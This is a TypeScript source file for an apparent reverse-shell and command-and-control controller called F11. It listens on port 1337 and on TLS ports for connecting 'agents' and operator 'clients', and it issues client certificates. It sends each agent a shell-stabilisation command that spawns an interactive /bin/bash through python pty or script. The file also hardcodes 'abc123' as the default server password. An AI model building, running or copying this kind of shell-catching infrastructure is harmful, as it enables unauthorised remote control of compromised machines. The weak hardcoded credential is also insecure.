import 'colors';
import fs from 'fs';
import pem from 'pem';
import path from 'path';
import crypto from 'crypto';
import { Socket, Server } from 'net';
import { Server as TLSServer, TLSSocket, TLSSocketOptions } from 'tls';
import { WebSocketServer, WebSocket } from 'ws';
import { IncomingMessage, ServerResponse as WebServerResponse } from 'http';
import { Server as WebServer } from 'https';

import { F11Base } from './Base';
import { F11Relay } from './Relay';
import { F11Agent } from './Agent';
import { F11Client } from './Client';

const DEFAULT_HOST = '127.0.0.1';
const DEFAULT_WEB_PORT = 4040;
const DEFAULT_OPEN_PORT = 1337;
const DEFAULT_AGENT_PORT = 1111;
const DEFAULT_CLIENT_PORT = 2222;
const DEFAULT_PROMPT = `F11> `;
const STABALIZE = `python3 -c 'import pty; pty.spawn("/bin/bash")' || python -c 'import pty; pty.spawn("/bin/bash")' || script -qc /bin/bash /dev/null`;

const {
  SERVER_PASSWORD = 'abc123',
  SERVER_HOST_NAME = 'localhost',
  SERVER_CERT_NAME = 'server.certificate.pem',
  SERVER_KEY_NAME = 'server.clientKey.pem',
  SERVER_CA_NAME = 'server.certificate.pem',
  SERVER_CA_KEY_NAME = 'server.serviceKey.pem',
  STRIPE_SECRET_KEY
} = process.env;

const CERT_DIR = path.join(__dirname, '../../certs');

export class F11Controller extends F11Base {
  public web: WebServer;
  public wss: WebSocketServer;
  public openServer: Server;
  public agentServer: TLSServer;
  public clientServer: TLSServer;

  public agents: F11Agent[] = [];
  public clients: F11Client[] = [];

  constructor(
    public host = DEFAULT_HOST,
    public openPort = DEFAULT_OPEN_PORT,
    public agentPort = DEFAULT_AGENT_PORT,
    public clientPort = DEFAULT_CLIENT_PORT,
    public prompt = DEFAULT_PROMPT
  ) {
    super();

    /**
     * Other constructor things...
     */
  }

  public gen(force = false, cb: (err?: any) => void) {
    const serverCertFile = path.join(CERT_DIR, SERVER_CERT_NAME);
    const serverKeyFile = path.join(CERT_DIR, SERVER_KEY_NAME);
    const serviceCertFile = path.join(CERT_DIR, SERVER_CA_NAME);
    const serviceKeyFile = path.join(CERT_DIR, SERVER_CA_KEY_NAME);

    const serverOptions: pem.CertificateCreationOptions = {
      // csr: '',
      // altNames: [],
      days: 365,
      hash: 'sha256',
      selfSigned: true,
      clientKeyPassword: SERVER_PASSWORD
    };

    if (force || !fs.existsSync(serverCertFile)) {
      this.log.info(`Generating server certificates [${force ? 'forced' : 'first'}]`);

      pem.createCertificate(serverOptions, (err, data) => {
        this.log.info('Certs generated', data, err);

        if (err) {
          cb(err);
        } else {
          fs.writeFileSync(serverCertFile, data.certificate);
          fs.writeFileSync(serverKeyFile, data.clientKey);
          fs.writeFileSync(serviceCertFile, data.certificate);
          fs.writeFileSync(serviceKeyFile, data.serviceKey);

          cb();
        }
      });
    } else {
      cb();
    }
  }

  public register(name: string, password?: string) {
    if (!password) {
      password = crypto.randomBytes(32).toString('hex');
    }

    // Generate certs...
    const tlsOpts = this.tlsOptions(SERVER_CERT_NAME, SERVER_KEY_NAME, SERVER_CA_NAME);

    this.log.info('Generating Client KeyPair ...', { name, password });

    pem.createCertificate(
      this.signedCertOptions(name, tlsOpts.key as string, tlsOpts.cert as string, SERVER_PASSWORD, password),
      (err, keys) => {
        if (err) throw err;

        this.log.success('Client Keys Genereated:');
        this.log.info(`${name} client key:\n${keys.clientKey}`);
        this.log.info(`${name} client cert:\n${keys.certificate}`);
      }
    );
  }

  public signedCertOptions(
    commonName: string,
    serviceKey: string,
    serviceCertificate: string,
    serviceKeyPassword: string,
    clientPassword: string
  ): pem.CertificateCreationOptions {
    return {
      // csr: '',
      // extFile: '/path/to/ext',
      // config: '/path/to/config',
      // csrConfigFile: '/path/to/csr/config',
      // altNames: [],
      // keyBitsize: 4096,
      // hash: 'sha256',
      // country: 'US',
      // state: 'Colorado',
      // locality: 'Denver',
      // organization: 'F11',
      // organizationUnit: 'Snipe',
      // emailAddress: 'client@example.com',
      commonName,
      days: 1,
      serial: 1234,
      // serialFile: '/path/to/serial', // TODO: Submit PR for type fix?
      selfSigned: false,
      serviceKey,
      serviceCertificate,
      serviceKeyPassword,
      clientKeyPassword: clientPassword
    };
  }

  public tlsOptions(cert: string, key: string, caList?: string, requestCert = true, rejectUnauthorized = true): TLSSocketOptions {
    const certsDir = path.join(__dirname, '../../certs');

    return {
      key: fs.readFileSync(path.join(certsDir, key)),
      cert: fs.readFileSync(path.join(certsDir, cert)),
      ca: caList ? caList.split(',').map((ca) => fs.readFileSync(path.join(certsDir, ca.trim()))) : [],
      requestCert,
      rejectUnauthorized
    };
  }

  public startAgent(): void {
    const socket = new Socket();
    const agent = new F11Agent(this, new TLSSocket(socket));
    agent.start();
  }

  public startClient(quiet?: boolean): F11Client {
    const socket = new Socket();
    const client = new F11Client(this, new TLSSocket(socket), quiet);
    client.start();
    return client;
  }

  public startServer(): void {
    this.init();
    this.listen();
    this.handle();
  }

  public init(): void {
    this.log.debug('F11Controller#init()');

    this.openServer = new Server();
    this.agentServer = new TLSServer(this.tlsOptions(SERVER_CERT_NAME, SERVER_KEY_NAME, SERVER_CA_NAME, true, false));
    this.clientServer = new TLSServer(this.tlsOptions(SERVER_CERT_NAME, SERVER_KEY_NAME, SERVER_CA_NAME, true, true));
  }

  public listen(): void {
    this.openServer.listen(this.openPort, this.host, () => {
      this.log.info(`F11Open server listening: ${this.host}:${this.openPort}`);
    });

    this.agentServer.listen(this.agentPort, this.host, () => {
      this.log.info(`F11Agent server listening: ${this.host}:${this.agentPort}`);
    });

    this.clientServer.listen(this.clientPort, this.host, () => {
      this.log.info(`F11Client server listening: ${this.host}:${this.clientPort}`);
    });
  }

  public handle(): void {
    this.openServer.on('connection', this.connectAgent.bind(this));
    this.agentServer.on('secureConnection', this.connectAgent.bind(this));
    this.clientServer.on('secureConnection', this.connectClient.bind(this));
  }

  public debug(): void {
    this.log.debug(`${this.agents.length} F11Agent(s) | ${this.clients.length} F11Client(s)`);
  }

  public connectAgent(socket: TLSSocket | Socket): void {
    const agent = new F11Agent(this, socket);
    agent.init();
    agent.send(STABALIZE);
    this.agents.push(agent);
    agent.registered();
    this.debug();
  }

  public connectClient(socket: TLSSocket): void {
    const client = new F11Client(this, socket);
    client.init();
    this.clients.push(client);
    this.debug();
  }

  public disconnect(target: F11Relay): void {
    // this.log.debug(`Disconnecting target: ${target.signature} [${target.id}]`);

    if (target instanceof F11Agent) {
      this.disconnectAgent(target);
    } else if (target instanceof F11Client) {
      this.disconnectClient(target);
    } else {
      this.log.warn(`Invalid target type, cannot disconnect:`, target);
    }

    this.debug();
  }

  public disconnectAgent(agent: F11Agent): void {
    this.agents = this.agents.filter((item) => item.id !== agent.id);
  }

  public disconnectClient(client: F11Client): void {
    this.clients = this.clients.filter((item) => item.id !== client.id);
  }
}
